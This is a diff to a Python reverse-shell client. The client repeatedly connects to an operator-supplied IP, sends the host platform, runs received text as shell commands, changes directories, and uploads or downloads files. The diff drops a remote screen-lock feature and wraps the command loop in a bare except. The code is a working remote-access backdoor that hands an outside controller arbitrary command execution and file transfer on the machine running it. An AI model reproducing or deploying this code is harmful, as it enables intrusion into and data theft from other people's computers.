@@ -23,25 +23,28 @@ def change_dir(path):
         return str(err).encode()
 
 
-def handle_data(client_socket):
+def handle_data(client_socket, cmd_func_mapping):
     """ Handle user data """
-    cmd_func_mapping = {"lock": screen_lock, "download": download_file, "upload": upload_file}
-    while True:    
-        data = client_socket.recv(MAX_BYTES).decode()
-        if data.strip() == "exit" or not data:
-            break
-        cmd = data.split(" ")
-        func = cmd_func_mapping.get(cmd[0], None)
-        if func:
-            func(client_socket, cmd)
-            continue
-        shell_cmd_thread = threading.Thread(target=shell_command, args=(client_socket, data), daemon=True)
-        shell_cmd_thread.start()
+    client_socket.send(sys.platform.encode())
+    try:    
+        while True:
+            data = client_socket.recv(MAX_BYTES).decode()
+            if data.strip() == "exit" or not data:
+                break
+            cmd = data.split(" ")
+            func = cmd_func_mapping.get(cmd[0], None)
+            if func:
+                func(client_socket, cmd)
+                continue
+            shell_cmd_thread = threading.Thread(target=shell_command, args=(client_socket, data), daemon=True)
+            shell_cmd_thread.start()
+    except:
+        pass
         
 
 def shell_command(client_socket, data):
     if data.startswith("cd "):
-        directory = data[3:]
+        directory = data.split(" ", 1)[1]
         cmd_output = change_dir(directory)
     else:
         cmd_output = run_shell_cmd(data)
@@ -86,17 +89,6 @@ def download_file(client_socket, cmd):
         client_socket.send(str(e).encode())
 
 
-def screen_lock(client_socket, cmd):
-    cmd_platform = {"linux": "xdg-screensaver lock", "win32": "Rundll32.exe user32.dll,LockWorkStation", "darwin": "pmset displaysleepnow"}
-    platform = sys.platform
-    cmd = cmd_platform.get(platform, None)
-    if cmd:
-        run_shell_cmd(cmd)
-        client_socket.send("Command executed".encode())
-    else:
-        client_socket.send("screen lock is not supported on target machine".encode())
-    
-
 def get_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('--ip', type=str, required=True)
@@ -108,6 +100,7 @@ def get_args():
 
 def main():
     args = get_args()
+    cmd_func_mapping = {"download": download_file, "upload": upload_file}
     while 1:    
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -115,7 +108,7 @@ def main():
         except Exception as err:
             print(F"Error occured while trying to connect to server: {err}")
         else:
-            handle_data(client_socket)
+            handle_data(client_socket, cmd_func_mapping)
         finally:
             client_socket.close()
     
